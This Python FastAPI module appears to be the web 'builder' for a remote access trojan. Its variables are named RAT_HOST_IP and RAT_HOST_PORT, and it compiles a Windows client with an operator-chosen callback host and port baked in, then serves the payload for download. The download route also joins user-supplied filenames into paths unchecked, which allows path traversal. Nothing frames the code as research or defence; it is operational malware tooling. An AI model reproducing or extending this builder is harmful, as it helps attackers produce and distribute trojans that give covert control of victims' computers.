import os
import platform
import subprocess
import asyncio
from fastapi import APIRouter, Request, Form
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.templating import Jinja2Templates

router = APIRouter()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_DIR = os.path.join(BASE_DIR, "..", "templates")
templates = Jinja2Templates(directory=TEMPLATE_DIR)

# Assume the client project is one level up from the 'host' directory
CLIENT_PROJECT_PATH = os.path.abspath(os.path.join(BASE_DIR, "..", "client"))


@router.get("/", response_class=HTMLResponse)
async def get_builder_page(request: Request):
    return templates.TemplateResponse("builder.html", {"request": request})


@router.post("/build_client")
async def build_client(
    request: Request,
    host_ip: str = Form(...),
    port: str = Form(...),
    client_name: str = Form(...)
):
    build_env = os.environ.copy()
    build_env["RAT_HOST_IP"] = host_ip
    build_env["RAT_HOST_PORT"] = port

    # --- FIX: Determine the correct executable name based on the build server's OS ---
    # We build for Windows target, but check what cargo creates
    target_triple = "x86_64-pc-windows-gnu"
    build_command = ["cargo", "build", "--release", "--target", target_triple]

    # The output path cargo creates
    source_executable_name = "client.exe"
    built_file_path = os.path.join(CLIENT_PROJECT_PATH, "target", target_triple, "release", source_executable_name)

    # --- End Fix ---

    process = await asyncio.create_subprocess_exec(
        *build_command,
        cwd=CLIENT_PROJECT_PATH,
        env=build_env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    stdout, stderr = await process.communicate()

    build_log = stdout.decode(errors='ignore') + stderr.decode(errors='ignore')

    if process.returncode == 0 and os.path.exists(built_file_path):
        download_url = f"/builder/download/{client_name}"

        # The final path where we store the downloadable file (inside the 'host' dir)
        downloadable_file_path = os.path.join(BASE_DIR, "..", client_name)

        os.rename(built_file_path, downloadable_file_path)

        response_html = f"""
            <div class="bg-green-800 border border-green-500 p-4 rounded-lg">
                <h3 class="font-bold text-lg">Build successful!</h3>
                <a href="{download_url}" class="text-blue-300 hover:underline" download>Download {client_name}</a>
            </div>
            <pre class="bg-gray-900 p-4 rounded-lg mt-4 text-xs whitespace-pre-wrap">{build_log}</pre>
        """
    else:
        response_html = f"""
            <div class="bg-red-800 border border-red-500 p-4 rounded-lg">
                <h3 class="font-bold text-lg">Build failed! See log below.</h3>
            </div>
            <pre class="bg-gray-900 p-4 rounded-lg mt-4 text-xs whitespace-pre-wrap">{build_log}</pre>
        """
    return HTMLResponse(response_html)

@router.get("/download/{filename}")
async def download_file(filename: str):
    file_path = os.path.join(BASE_DIR, "..", filename)
    if os.path.exists(file_path):
        return FileResponse(path=file_path, media_type='application/octet-stream', filename=filename)
    return HTMLResponse("File not found", status_code=404)
